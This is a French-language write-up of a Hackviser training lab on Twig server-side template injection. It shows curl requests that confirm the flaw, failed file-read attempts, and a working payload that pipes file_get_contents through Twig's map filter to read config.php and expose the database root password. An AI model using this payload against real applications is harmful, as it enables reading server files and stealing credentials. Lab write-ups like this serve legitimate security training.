# Writeup: Basic SSTI - Hackviser

## Lab: Server-Side Template Injection (SSTI) in Twig (PHP)

**Objectif :** Exploiter la vulnérabilité SSTI dans la boîte de recherche pour accéder au contenu du fichier `config.php` et en extraire le mot de passe de la base de données.

**URL du Lab :** https://tough-rocket-raccoon.europe1.hackviser.space

### 1. Reconnaissance initiale et identification de la vulnérabilité

1.  **Accès à l'application :** J'ai accédé à l'URL fournie. L'application présente une simple page de recherche.
2.  **Inspection du formulaire de recherche :** J'ai utilisé `curl` pour récupérer le code source HTML de la page d'accueil afin d'identifier le nom du paramètre de recherche et la méthode du formulaire.

    ```bash
    curl https://tough-rocket-raccoon.europe1.hackviser.space
    ```

    Le code source a révélé un formulaire `GET` avec un champ d'entrée nommé `q` :

    ```html
    <form method="get" action="/">
      <input type="text" name="q" value="" placeholder="Search..." autocomplete="off" />
      <button type="submit">Search</button>
    </form>
    ```

    Cela indique que les requêtes de recherche sont effectuées via `?q=`.

3.  **Test SSTI initial :** J'ai testé un payload Twig simple `{{ 7*7 }}` pour confirmer la présence d'une injection de modèle.

    ```bash
    curl "https://tough-rocket-raccoon.europe1.hackviser.space/?q=%7B%7B%207*7%20%7D%7D"
    ```

    La réponse a inclus `49` dans la section des résultats :

    ```html
    <span class="value">49 not found</span>
    ```

    Cette confirmation indique une vulnérabilité d'injection de modèle côté serveur (SSTI) car l'expression Twig `{{ 7*7 }}` a été évaluée.

### 2. Exploitation de la vulnérabilité pour lire `config.php`

L'objectif est de lire le fichier `config.php`. Après avoir confirmé la SSTI, la prochaine étape consiste à trouver un moyen de lire les fichiers sur le système.

1.  **Tentative de lecture de fichier avec `source()` :** J'ai d'abord essayé d'utiliser la fonction `source()` de Twig pour lire `config.php`.

    ```bash
    curl "https://tough-rocket-raccoon.europe1.hackviser.space/?q=%7B%7B%20source%28%27config.php%27%29%20%7D%7D"
    ```

    Ceci a généré une erreur : `Error: Unable to find template "config.php" (looked into: /var/www/html/templates)`. Cela a indiqué que `source()` recherchait dans le répertoire des modèles Twig, et non à la racine de l'application.

2.  **Tentative de traversée de répertoire :** J'ai ensuite tenté une traversée de répertoire avec `../` pour remonter d'un niveau à partir du répertoire des modèles (`/var/www/html/templates`) vers la racine (`/var/www/html`).

    ```bash
    curl "https://tough-rocket-raccoon.europe1.hackviser.space/?q=%7B%7B%20source%28%27..%2Fconfig.php%27%29%20%7D%7D"
    ```

    Cette tentative a également échoué avec l'erreur : `Error: Looks like you try to load a template outside configured directories (../config.php)`. Cela a confirmé que la traversée de répertoire était bloquée.

3.  **Utilisation de `map()` avec `file_get_contents()` :** Étant donné les restrictions précédentes, j'ai cherché une méthode pour exécuter des fonctions PHP arbitraires. Une technique courante en Twig SSTI est d'utiliser le filtre `map` en conjonction avec une fonction PHP comme `file_get_contents()`.

    ```bash
    curl "https://tough-rocket-raccoon.europe1.hackviser.space/?q=%7B%7B%20%5B%27config.php%27%5D%7Cmap%28%27file_get_contents%27%29%7Cjoin%20%7D%7D"
    ```

    Ce payload a été un succès ! La réponse de l'application a affiché le contenu complet du fichier `config.php`.

    ```php
    <?php

    $config = [
        'database' => [
            'host' => 'localhost',
            'port' => 3306,
            'username' => 'root',
            'password' => 'kfqEnLyBrT2JaS',
            'database' => 'app_db',
        ],
    ];

    ?>
    ```

### 3. Extraction du mot de passe de la base de données

À partir du contenu du fichier `config.php`, j'ai pu identifier le mot de passe de la base de données :

**Mot de passe :** `kfqEnLyBrT2JaS`

### Conclusion

La vulnérabilité Server-Side Template Injection a été exploitée avec succès en utilisant une combinaison du filtre `map` de Twig et de la fonction PHP `file_get_contents()` pour lire le fichier `config.php` et en extraire le mot de passe de la base de données.
